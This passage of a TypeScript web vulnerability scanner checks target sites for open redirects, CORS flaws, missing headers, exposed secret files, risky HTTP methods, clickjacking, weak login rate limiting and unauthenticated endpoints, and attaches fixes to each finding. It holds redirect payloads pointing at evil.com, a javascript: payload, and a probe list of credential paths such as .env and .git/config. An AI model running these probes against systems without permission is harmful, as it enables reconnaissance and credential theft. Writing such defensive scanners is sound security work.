                ? `Remote File Inclusion in parameter '${key}' allows executing code from an attacker-controlled remote server. By hosting a malicious PHP/script file, the attacker can achieve full remote code execution with web server privileges.`
                : `Local File Inclusion in parameter '${key}' allows reading arbitrary files on the server (config files, /etc/passwd, private keys, application source code) and may lead to remote code execution via log poisoning.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: 'File inclusion execution detected in response',
              recommendation: 'Use a hard-coded whitelist of allowed file names. Never construct file paths from user input. Disable allow_url_include in PHP. Use realpath() and check against allowed base directories.',
              cweId: isRFI ? 'CWE-98' : 'CWE-22',
              cvssScore: isRFI ? '9.8' : '7.5'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  // ─── NEW MODULE IMPLEMENTATIONS ────────────────────────────────────────────

  private async testOpenRedirect(scan: Scan): Promise<void> {
    const redirectPayloads = [
      'https://evil.com', 'http://evil.com',
      '//evil.com', '///evil.com',
      'https://evil.com%2F@trusted.com',
      'javascript:alert(1)',
      'https://trusted.com.evil.com'
    ];

    const url = new URL(scan.targetUrl);
    if (!url.search) return;

    for (const payload of redirectPayloads) {
      try {
        const testUrl = new URL(scan.targetUrl);
        const params = new URLSearchParams(testUrl.search);

        for (const [key] of Array.from(params.entries())) {
          if (!['redirect', 'next', 'url', 'return', 'goto', 'dest', 'destination', 'callback', 'to', 'redir', 'r_url'].some(k => key.toLowerCase().includes(k))) continue;

          const originalValue = params.get(key);
          params.set(key, payload);
          testUrl.search = params.toString();

          const response = await axios.get(testUrl.toString(), {
            timeout: 8000,
            maxRedirects: 0,
            validateStatus: (s) => s < 400 || s === 301 || s === 302 || s === 303 || s === 307 || s === 308
          });
          await this.incrementRequestCount(scan.id);

          const location = response.headers['location'] || '';
          if ([301, 302, 303, 307, 308].includes(response.status) && location.includes('evil.com')) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'open_redirect',
              severity: 'medium',
              title: 'Open Redirect Vulnerability',
              description: `Parameter '${key}' allows redirecting users to arbitrary external URLs. Attackers use open redirects to lend legitimacy to phishing links (the URL starts with your trusted domain), steal OAuth tokens by redirecting auth callbacks to attacker servers, or bypass referrer-based access controls.`,
              url: testUrl.toString(),
              parameter: key,
              payload,
              evidence: `HTTP ${response.status} redirects to: ${location}`,
              recommendation: 'Use a whitelist of allowed redirect destinations. If dynamic redirects are needed, use opaque tokens mapped to destination URLs server-side. Reject any redirect URL that is not relative or not in the allowlist.',
              cweId: 'CWE-601',
              cvssScore: '6.1'
            });
          }

          if (originalValue) params.set(key, originalValue);
          else params.delete(key);
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testCORSMisconfiguration(scan: Scan): Promise<void> {
    const origins = ['https://evil.com', 'null', 'https://evil.' + new URL(scan.targetUrl).hostname];

    for (const origin of origins) {
      try {
        const response = await axios.get(scan.targetUrl, {
          headers: { 'Origin': origin },
          timeout: 8000,
          validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        const acao = response.headers['access-control-allow-origin'];
        const acac = response.headers['access-control-allow-credentials'];

        if (acao === origin || acao === '*') {
          const isCredentialed = acac === 'true';
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'cors_misconfiguration',
            severity: isCredentialed ? 'critical' : 'high',
            title: isCredentialed ? 'CORS Misconfiguration with Credentials (Critical)' : 'CORS Misconfiguration — Overly Permissive Policy',
            description: isCredentialed
              ? `The server reflects the attacker's Origin (${origin}) and also sets Access-Control-Allow-Credentials: true. This is a critical CORS misconfiguration: any website can make credentialed cross-origin requests (with cookies/session tokens) and read the response. An attacker's page can silently make API calls on behalf of a logged-in victim and steal private data.`
              : `The server allows cross-origin requests from ${origin === '*' ? 'any origin (wildcard)' : origin}. Attackers can make cross-origin API calls from malicious pages and read response data. Particularly dangerous for APIs that return sensitive user information.`,
            url: scan.targetUrl,
            parameter: null,
            payload: `Origin: ${origin}`,
            evidence: `Access-Control-Allow-Origin: ${acao}${isCredentialed ? ', Access-Control-Allow-Credentials: true' : ''}`,
            recommendation: 'Maintain an explicit allowlist of trusted origins. Never reflect the Origin header directly. Never combine wildcard (*) with Allow-Credentials. Use vary: Origin to prevent caching attacks.',
            cweId: 'CWE-942',
            cvssScore: isCredentialed ? '9.3' : '7.5'
          });
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testSecurityHeaders(scan: Scan): Promise<void> {
    try {
      const response = await axios.get(scan.targetUrl, {
        timeout: 8000, validateStatus: () => true
      });
      await this.incrementRequestCount(scan.id);

      const h = response.headers;

      const checks: Array<{ header: string; present: boolean; title: string; description: string; recommendation: string; cvss: string }> = [
        {
          header: 'content-security-policy',
          present: !!h['content-security-policy'],
          title: 'Missing Content Security Policy (CSP)',
          description: 'Without a CSP, the browser accepts inline scripts and resources from any origin. Attackers who inject content (via XSS or a compromised CDN) can run arbitrary JavaScript, exfiltrate data, or load malware with no browser-level barrier.',
          recommendation: "Add a strict CSP: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'. Start in report-only mode to avoid breakage.",
          cvss: '6.1'
        },
        {
          header: 'x-frame-options',
          present: !!h['x-frame-options'] || h['content-security-policy']?.includes('frame-ancestors'),
          title: 'Missing Clickjacking Protection (X-Frame-Options)',
          description: 'Without X-Frame-Options or CSP frame-ancestors, attackers can embed this page in an invisible iframe on their site. By layering UI tricks (clickjacking), victims are tricked into clicking buttons they cannot see — changing passwords, authorizing payments, or granting permissions.',
          recommendation: "Add header: X-Frame-Options: DENY  (or SAMEORIGIN if framing is needed internally). Prefer CSP: frame-ancestors 'none'.",
          cvss: '4.3'
        },
        {
          header: 'x-content-type-options',
          present: !!h['x-content-type-options'],
          title: 'Missing X-Content-Type-Options Header',
          description: 'MIME-type sniffing can cause browsers to execute non-script content as JavaScript. An attacker who uploads an image containing script code could exploit this to run XSS without a traditional injection point.',
          recommendation: 'Add header: X-Content-Type-Options: nosniff',
          cvss: '3.7'
        },
        {
          header: 'referrer-policy',
          present: !!h['referrer-policy'],
          title: 'Missing Referrer Policy Header',
          description: 'Without a Referrer-Policy, the full URL (including query parameters) is sent as the Referer header to third-party sites. This can leak sensitive tokens, session IDs, or PII embedded in URLs to analytics services, ad networks, or CDNs.',
          recommendation: "Add header: Referrer-Policy: strict-origin-when-cross-origin",
          cvss: '3.1'
        },
        {
          header: 'permissions-policy',
          present: !!h['permissions-policy'],
          title: 'Missing Permissions Policy Header',
          description: "Without Permissions-Policy, any embedded iframe or injected script can access powerful browser APIs (camera, microphone, geolocation, payment). Attackers with XSS access can silently activate these features.",
          recommendation: "Add header: Permissions-Policy: geolocation=(), microphone=(), camera=()",
          cvss: '3.1'
        }
      ];

      for (const check of checks) {
        if (!check.present) {
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'security_headers',
            severity: parseFloat(check.cvss) >= 6 ? 'medium' : 'low',
            title: check.title,
            description: check.description,
            url: scan.targetUrl,
            parameter: null,
            payload: null,
            evidence: `${check.header} header not present in HTTP response`,
            recommendation: check.recommendation,
            cweId: 'CWE-693',
            cvssScore: check.cvss
          });
        }
      }
    } catch (_) { /* continue */ }
  }

  private async testSensitiveDataExposure(scan: Scan): Promise<void> {
    const sensitivePaths = [
      '/.env', '/.env.production', '/.env.local', '/.env.backup',
      '/config.json', '/config.yml', '/config.yaml', '/settings.json',
      '/wp-config.php', '/database.yml', '/database.json',
      '/backup.zip', '/backup.tar.gz', '/dump.sql',
      '/.git/config', '/.git/HEAD',
      '/phpinfo.php', '/info.php', '/test.php',
      '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
      '/api-docs', '/swagger.json', '/openapi.json', '/swagger-ui.html',
      '/.htpasswd', '/.htaccess',
      '/server-status', '/server-info',
      '/actuator/env', '/actuator/health', '/actuator/beans',
      '/api/v1/users', '/api/users', '/users.json'
    ];

    for (const path of sensitivePaths) {
      try {
        const testUrl = new URL(scan.targetUrl);
        testUrl.pathname = path;

        const response = await axios.get(testUrl.toString(), {
          timeout: 6000, validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        if (response.status === 200 && response.data && response.data.toString().length > 10) {
          const data = response.data.toString();
          const hasSecrets = /password|secret|key|token|db_|database|api_key|private/i.test(data);

          if (hasSecrets || path.startsWith('/.git') || path.includes('phpinfo') || path.includes('actuator')) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'sensitive_data_exposure',
              severity: hasSecrets ? 'critical' : 'high',
              title: hasSecrets ? `Secret/Credential File Exposed: ${path}` : `Sensitive File Accessible: ${path}`,
              description: hasSecrets
                ? `The file at ${path} is publicly accessible and appears to contain credentials, API keys, or secrets. An attacker can read database passwords, API tokens, encryption keys, and use them to compromise the entire system.`
                : `Sensitive file at ${path} is publicly accessible. Attackers scan for these common files to gather information about the technology stack, internal APIs, users, or configuration.`,
              url: testUrl.toString(),
              parameter: null,
              payload: null,
              evidence: `HTTP 200 response from ${path} (${data.length} bytes)${hasSecrets ? ' — credential patterns detected' : ''}`,
              recommendation: `Block access to ${path} via web server rules. Move sensitive files outside the web root. Ensure .env and config files are in .gitignore. Use environment variables for secrets instead of config files.`,
              cweId: 'CWE-200',
              cvssScore: hasSecrets ? '9.1' : '7.5'
            });
          }
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testHTTPMethods(scan: Scan): Promise<void> {
    const dangerousMethods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT', 'OPTIONS'];

    for (const method of dangerousMethods) {
      try {
        const response = await axios.request({
          method,
          url: scan.targetUrl,
          timeout: 8000,
          validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        const responseStr = typeof response.data === 'string' ? response.data : JSON.stringify(response.data ?? '');
        if (method === 'TRACE' && response.status === 200 && responseStr.includes('TRACE')) {
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'http_methods',
            severity: 'medium',
            title: 'HTTP TRACE Method Enabled (XST Risk)',
            description: 'The TRACE method echoes the incoming request back to the client. Combined with XSS, this enables Cross-Site Tracing (XST): an attacker can steal HttpOnly cookies that are normally inaccessible to JavaScript by triggering a TRACE request from a victim\'s browser.',
            url: scan.targetUrl,
            parameter: null,
            payload: 'HTTP TRACE request',
            evidence: 'TRACE method returned HTTP 200 with request echo',
            recommendation: 'Disable the TRACE method in your web server configuration (TraceEnable Off in Apache, proxy_no_cache in Nginx).',
            cweId: 'CWE-16',
            cvssScore: '5.8'
          });
        }

        if (method === 'OPTIONS' && response.status === 200) {
          const allow = response.headers['allow'] || '';
          const dangerous = ['PUT', 'DELETE', 'CONNECT'].filter(m => allow.toUpperCase().includes(m));
          if (dangerous.length > 0) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'http_methods',
              severity: 'medium',
              title: `Dangerous HTTP Methods Allowed: ${dangerous.join(', ')}`,
              description: `Server reports these potentially dangerous HTTP methods as allowed: ${dangerous.join(', ')}. PUT can allow unauthorized file uploads. DELETE can remove content. Attackers probe for these methods to overwrite files or delete application content.`,
              url: scan.targetUrl,
              parameter: null,
              payload: 'OPTIONS request',
              evidence: `Allow: ${allow}`,
              recommendation: 'Restrict allowed HTTP methods to only GET and POST (and HEAD). Explicitly deny PUT, DELETE, TRACE, and CONNECT in your web server config.',
              cweId: 'CWE-16',
              cvssScore: '5.3'
            });
          }
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testClickjacking(scan: Scan): Promise<void> {
    try {
      const response = await axios.get(scan.targetUrl, {
        timeout: 8000, validateStatus: () => true
      });
      await this.incrementRequestCount(scan.id);

      const h = response.headers;
      const hasXFO = !!h['x-frame-options'];
      const hasCSPFrameAncestors = h['content-security-policy']?.includes('frame-ancestors');

      if (!hasXFO && !hasCSPFrameAncestors) {
        await storage.createVulnerability({
          scanId: scan.id,
          type: 'clickjacking',
          severity: 'medium',
          title: 'Clickjacking Protection Missing',
          description: 'This page can be embedded in an iframe on any website. Clickjacking attacks overlay the legitimate page with an invisible iframe and position it under attractive decoy buttons. When the user clicks the decoy, they are actually clicking a button on the target site. Attackers can trick users into liking content, making purchases, submitting forms, or changing account settings without their knowledge.',
          url: scan.targetUrl,
          parameter: null,
          payload: null,
          evidence: 'No X-Frame-Options or Content-Security-Policy frame-ancestors directive found',
          recommendation: "Add X-Frame-Options: DENY to prevent any framing, or SAMEORIGIN if same-domain framing is required. Alternatively use CSP: Content-Security-Policy: frame-ancestors 'none'. JavaScript frame-busting is insufficient — use HTTP headers.",
          cweId: 'CWE-1021',
          cvssScore: '4.3'
        });
      }
    } catch (_) { /* continue */ }
  }

  private async testRateLimiting(scan: Scan): Promise<void> {
    const loginPaths = ['/login', '/api/login', '/api/auth', '/auth/login', '/signin', '/api/signin'];

    for (const path of loginPaths) {
      try {
        const testUrl = new URL(scan.targetUrl);
        testUrl.pathname = path;

        // Send 5 rapid requests and check if any rate-limiting kicks in
        const requests = Array.from({ length: 5 }, () =>
          axios.post(testUrl.toString(), { username: 'test', password: 'wrong' }, {
            timeout: 5000, validateStatus: () => true
          })
        );

        const responses = await Promise.allSettled(requests);
        const statuses = responses
          .filter((r): r is PromiseFulfilledResult<any> => r.status === 'fulfilled')
          .map(r => r.value.status);

        const hasRateLimit = statuses.some(s => s === 429);
        const allOkNoLimit = statuses.filter(s => s === 200 || s === 401 || s === 403).length === statuses.length;

        if (allOkNoLimit && statuses.length >= 4 && !hasRateLimit) {
          await storage.createVulnerability({
            scanId: scan.id,
            type: 'rate_limiting',
            severity: 'medium',
            title: `No Rate Limiting on Login Endpoint: ${path}`,
            description: `The endpoint ${path} has no apparent rate limiting. Attackers can perform brute-force and credential-stuffing attacks — automatically trying thousands of username/password combinations — without triggering any throttling, lockout, or CAPTCHA. This allows automated account takeover at scale.`,
            url: testUrl.toString(),
            parameter: null,
            payload: '5 rapid POST requests',
            evidence: `Responses to 5 rapid requests: ${statuses.join(', ')} — no 429 Too Many Requests`,
            recommendation: 'Implement rate limiting on authentication endpoints (e.g., 5 attempts per minute per IP). Add account lockout after repeated failures. Use CAPTCHA for human verification. Monitor and alert on brute-force patterns. Consider using a WAF.',
            cweId: 'CWE-307',
            cvssScore: '6.5'
          });
          break;
        }
      } catch (_) { /* continue */ }
    }
  }

  private async testBrokenAccessControl(scan: Scan): Promise<void> {
    const sensitiveEndpoints = [
      '/api/admin', '/api/users', '/api/config', '/api/settings',
      '/api/v1/admin', '/api/v1/users', '/api/internal',
      '/admin/users', '/admin/config', '/admin/logs',
      '/private', '/internal', '/management'
    ];

    for (const endpoint of sensitiveEndpoints) {
      try {
        const testUrl = new URL(scan.targetUrl);
        testUrl.pathname = endpoint;

        // Test without auth
        const response = await axios.get(testUrl.toString(), {
          timeout: 8000, validateStatus: () => true
        });
        await this.incrementRequestCount(scan.id);

        if (response.status === 200) {
          const data = response.data;
          const hasUserData = typeof data === 'object' && (
            Array.isArray(data) ||
            JSON.stringify(data).match(/email|username|password|role|admin/i)
          );

          if (hasUserData) {
            await storage.createVulnerability({
              scanId: scan.id,
              type: 'broken_access_control',
              severity: 'critical',
              title: `Broken Access Control — Unauthenticated Access to ${endpoint}`,
              description: `Sensitive API endpoint ${endpoint} returns data without requiring authentication. Attackers can enumerate all users, access private configuration, read audit logs, or modify system settings by directly calling these API endpoints without any credentials. This is one of the OWASP Top 10 most critical vulnerabilities.`,
              url: testUrl.toString(),
              parameter: null,
              payload: null,
              evidence: `HTTP 200 with ${typeof data === 'object' ? Object.keys(data).join(', ') : 'data'} — no auth required`,
              recommendation: 'Apply authentication middleware to ALL API routes. Verify the authenticated user\'s role/permission before returning data. Default to deny — explicitly grant access rather than restricting it. Log all access control failures.',
              cweId: 'CWE-284',
              cvssScore: '9.8'
            });
          }
        }
      } catch (_) { /* continue */ }
    }
  }
}

export const scanner = new SecurityScanner();
